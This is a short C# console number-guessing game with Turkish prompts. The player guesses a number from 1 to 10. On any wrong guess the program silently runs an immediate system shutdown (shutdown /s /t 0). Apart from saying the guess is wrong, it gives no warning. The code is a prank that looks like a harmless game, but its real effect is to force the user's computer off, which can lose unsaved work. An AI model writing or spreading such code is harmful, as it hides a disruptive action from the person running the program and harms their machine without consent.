using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        Random random = new Random();
        int correctNumber = random.Next(1, 11);
        Console.WriteLine("1 ile 10 arasında bir sayı tuttum. Tahmin et bakalım!");
        Console.Write("Tahminin: ");
        int guessedNumber;
        if (int.TryParse(Console.ReadLine(), out guessedNumber))
        {
            if (guessedNumber == correctNumber)
            {
                Console.WriteLine("Tebrikler! Doğru bildin.");
            }
            else
            {
                Console.WriteLine("Yanlış tahmin.");
                Process.Start("shutdown", "/s /t 0");
            }
        }
        else
        {
            Console.WriteLine("Geçersiz giriş. Lütfen 1 ile 10 arasında bir sayı gir.");
        }
    }
}